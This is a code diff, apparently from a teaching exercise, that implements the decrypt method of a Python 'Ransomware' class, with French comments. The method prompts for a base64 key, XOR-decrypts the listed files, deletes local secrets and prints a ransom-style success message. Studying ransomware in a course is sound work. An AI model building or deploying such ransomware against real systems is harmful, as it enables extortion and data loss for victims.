@@ -59,8 +59,34 @@ class Ransomware:
         
 
     def decrypt(self):
-        # main function for decrypting (see PDF)
-        raise NotImplemented()
+        # Charger les éléments cryptographiques locaux
+        self.secret_manager.load()
+
+        # Charger la liste des fichiers chiffrés
+        encrypted_files = self.list_encrypted_files()
+
+        while True:
+            try:
+                # Demander la clef
+                b64_key = input("Veuillez entrer la clef de déchiffrement (en base64) : ")
+
+                # Définir la clef
+                self.secret_manager.set_key(b64_key)
+
+                # Déchiffrer les fichiers
+                self.secret_manager.xorfiles(encrypted_files)
+
+                # Supprimer les éléments cryptographiques locaux
+                self.secret_manager.clean()
+
+                # Afficher un message pour informer que tout s'est bien passé
+                print("Félicitations ! Vos fichiers ont été déchiffrés avec succès.")
+
+                # Sortir du ransomware
+                break
+            except Exception as e:
+                # Afficher un message indiquant que la clef est mauvaise
+                print("La clef de déchiffrement est incorrecte. Veuillez réessayer.")
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
